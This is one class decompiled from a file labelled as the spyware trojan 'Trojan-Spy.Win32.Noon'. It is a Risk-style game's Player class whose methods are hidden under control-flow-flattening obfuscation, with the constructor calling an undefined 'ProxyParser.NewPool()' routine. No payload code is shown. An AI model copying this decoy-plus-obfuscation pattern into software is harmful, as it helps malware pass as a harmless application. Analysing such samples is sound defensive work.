// Decompiled with JetBrains decompiler
// Type: RiskGame.Player
// Assembly: ArrayWithOff, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: C12E9A27-BEBF-4775-817A-6AC642D52B19
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\Trojan-Spy.Win32.Noon.bcra-344266b0bd586b6b9907f1657c694060dd1bae1df9fda81d7433002d419fe4fa.exe

using ArrayWithOff.Database;
using System;
using System.ComponentModel;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Media;

namespace RiskGame
{
  [Serializable]
  public abstract class Player : INotifyPropertyChanged
  {
    public int m_Producer;
    private int _Listener;
    private int rules;
    public int _Instance;
    private byte order;
    private byte interpreter;
    private byte proccesor;
    [NonSerialized]
    private SolidColorBrush m_Printer;
    [NonSerialized]
    private Label _Registry;
    [NonSerialized]
    private Label filter;

    [MethodImpl(MethodImplOptions.NoInlining)]
    public Player(string spec)
    {
      int num1 = 3;
      while (true)
      {
        int num2 = num1;
        while (true)
        {
          switch (num2)
          {
            case 0:
            case 3:
              goto label_1;
            case 1:
            case 2:
              this._Instance = 0;
              // ISSUE: explicit constructor call
              base.\u002Ector();
              if (true)
              {
                num2 = 4;
                continue;
              }
              goto case 5;
            case 4:
              string v = spec;
              if (v != null)
              {
                this.InterruptExpression(v);
                this.rules = 0;
                goto case 5;
              }
              else
                goto label_3;
            case 5:
              this.Territoriesowned = 0;
              num2 = 6;
              continue;
            case 6:
              goto label_10;
            default:
              goto label_7;
          }
        }
label_1:
        ProxyParser.NewPool();
        num1 = 2;
        continue;
label_7:
        num1 = 5;
      }
label_3:
      throw new ArgumentNullException("username");
label_10:;
    }

    [CompilerGenerated]
    [SpecialName]
    [MethodImpl(MethodImplOptions.NoInlining)]
    public string ResetExpression() => this._Manager;

    [CompilerGenerated]
    [SpecialName]
    [MethodImpl(MethodImplOptions.NoInlining)]
    public void InterruptExpression(string v) => this._Manager = v;

    public int Territoriesowned
    {
      [MethodImpl(MethodImplOptions.NoInlining)] get => this._Listener;
      [MethodImpl(MethodImplOptions.NoInlining)] set
      {
        int num1 = 4;
        bool flag;
        while (true)
        {
          switch (num1)
          {
            case 0:
            case 4:
              flag = this._Listener != value;
              int num2 = 2;
              num1 = Player.SetupContainer() ? num2 : num2;
              continue;
            case 1:
            case 2:
              if (!flag)
                goto label_6;
              else
                goto case 3;
            case 3:
              this._Listener = value;
              this.WriteExpression(nameof (Territoriesowned));
              num1 = 5;
              continue;
            case 5:
              goto label_7;
            default:
              num1 = 3;
              continue;
          }
        }
label_6:
        return;
label_7:;
      }
    }

    public int Army_strength
    {
      [MethodImpl(MethodImplOptions.NoInlining)] get => this.rules;
      [MethodImpl(MethodImplOptions.NoInlining)] set
      {
        int num1 = 0;
        while (true)
        {
          int num2 = num1;
          bool flag;
          while (true)
          {
            switch (num2)
            {
              case 0:
                flag = this.rules != value;
                if (Player.ConnectContainer())
                {
                  num2 = 3;
                  continue;
                }
                goto label_8;
              case 1:
              case 3:
                goto label_1;
              case 2:
              case 4:
                goto label_6;
              case 5:
                goto label_8;
              default:
                num2 = 4;
                continue;
            }
          }
label_1:
          if (flag)
            this.rules = value;
          else
            break;
label_6:
          this.WriteExpression(nameof (Army_strength));
          num1 = 5;
        }
        return;
label_8:;
      }
    }

    public SolidColorBrush Color
    {
      [MethodImpl(MethodImplOptions.NoInlining)] get => this.m_Printer;
      [MethodImpl(MethodImplOptions.NoInlining)] set
      {
        int num1 = 6;
        while (true)
        {
          int num2;
          switch (num1)
          {
            case 0:
              if (this.m_Printer != null)
              {
                this.order = this.m_Printer.Color.R;
                num2 = 2;
                break;
              }
              this.order = (byte) 0;
              if (true)
              {
                num1 = 5;
                continue;
              }
              goto case 6;
            case 1:
              goto label_11;
            case 2:
            case 4:
              this.interpreter = this.m_Printer.Color.G;
              this.proccesor = this.m_Printer.Color.B;
              num1 = 7;
              continue;
            case 3:
              goto label_12;
            case 5:
              goto label_6;
            case 6:
              this.m_Printer = value;
              num2 = 0;
              break;
            case 7:
              goto label_10;
            default:
              num2 = 1;
              break;
          }
          num1 = num2;
        }
label_6:
        this.interpreter = (byte) 0;
        this.proccesor = (byte) 0;
        return;
label_11:
        return;
label_12:
        return;
label_10:;
      }
    }

    [SpecialName]
    [MethodImpl(MethodImplOptions.NoInlining)]
    public Label QueryExpression() => this._Registry;

    [SpecialName]
    [MethodImpl(MethodImplOptions.NoInlining)]
    public void FindExpression(Label item)
    {
      this._Registry = item;
      this.ValidateExpression(ref this._Registry, "Army_strength");
    }

    [SpecialName]
    [MethodImpl(MethodImplOptions.NoInlining)]
    public Label AssetExpression() => this.filter;

    [SpecialName]
    [MethodImpl(MethodImplOptions.NoInlining)]
    public void ChangeExpression(Label item)
    {
      this.filter = item;
      this.ValidateExpression(ref this.filter, "Territoriesowned");
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    public void ExcludeExpression() => this.Color = new SolidColorBrush(System.Windows.Media.Color.FromRgb(this.order, this.interpreter, this.proccesor));

    public event PropertyChangedEventHandler PropertyChanged
    {
      [MethodImpl(MethodImplOptions.NoInlining)] add
      {
        int num = 4;
        PropertyChangedEventHandler changedEventHandler1;
        PropertyChangedEventHandler comparand;
        PropertyChangedEventHandler changedEventHandler2;
        while (true)
        {
          switch (num)
          {
            case 0:
            case 4:
              changedEventHandler1 = this.PropertyChanged;
              num = 3;
              continue;
            case 1:
            case 3:
              comparand = changedEventHandler1;
              num = 2;
              continue;
            case 2:
              changedEventHandler2 = comparand + value;
              goto case 5;
            case 5:
              changedEventHandler1 = Interlocked.CompareExchange<PropertyChangedEventHandler>(ref this.PropertyChanged, changedEventHandler2, comparand);
              if (changedEventHandler1 == comparand)
              {
                num = 6;
                continue;
              }
              goto case 1;
            case 6:
              goto label_8;
            default:
              num = 5;
              continue;
          }
        }
label_8:;
      }
      [MethodImpl(MethodImplOptions.NoInlining)] remove
      {
        int num1 = 3;
        while (true)
        {
          int num2 = num1;
          PropertyChangedEventHandler changedEventHandler;
          PropertyChangedEventHandler comparand;
          while (true)
          {
            switch (num2)
            {
              case 0:
                if (changedEventHandler != comparand)
                  goto case 1;
                else
                  goto label_3;
              case 1:
              case 5:
                comparand = changedEventHandler;
                num2 = 4;
                continue;
              case 2:
              case 4:
                changedEventHandler = Interlocked.CompareExchange<PropertyChangedEventHandler>(ref this.PropertyChanged, comparand - value, comparand);
                goto case 0;
              case 3:
                goto label_4;
              case 6:
                goto label_9;
              default:
                goto label_8;
            }
          }
label_3:
          num1 = 6;
          continue;
label_4:
          changedEventHandler = this.PropertyChanged;
          num1 = 5;
          continue;
label_8:
          num1 = 0;
        }
label_9:;
      }
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    public void WriteExpression(string ident)
    {
      int num1 = 2;
      while (true)
      {
        int num2 = num1;
        bool flag;
        while (true)
        {
          switch (num2)
          {
            case 0:
            case 2:
              goto label_1;
            case 1:
            case 4:
              if (!flag)
                goto label_4;
              else
                goto case 3;
            case 3:
              this.PropertyChanged((object) this, new PropertyChangedEventArgs(ident));
              int num3 = 5;
              num2 = Player.SetupContainer() ? num3 : num3;
              continue;
            case 5:
              goto label_8;
            default:
              goto label_7;
          }
        }
label_1:
        flag = this.PropertyChanged != null;
        num1 = 4;
        continue;
label_7:
        num1 = 3;
      }
label_4:
      return;
label_8:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void ValidateExpression(ref Label v, string result)
    {
      int num = 0;
      Binding binding;
      while (true)
      {
        switch (num)
        {
          case 0:
            binding = new Binding(result);
            num = 3;
            continue;
          case 1:
          case 3:
            binding.UpdateSourceTrigger = UpdateSourceTrigger.PropertyChanged;
            goto case 2;
          case 2:
          case 4:
            binding.Source = (object) this;
            v.SetBinding(ContentControl.ContentProperty, (BindingBase) binding);
            num = 5;
            continue;
          case 5:
            goto label_6;
          default:
            num = 4;
            continue;
        }
      }
label_6:;
    }

    internal static bool ConnectContainer() => true;

    internal static bool SetupContainer() => false;
  }
}
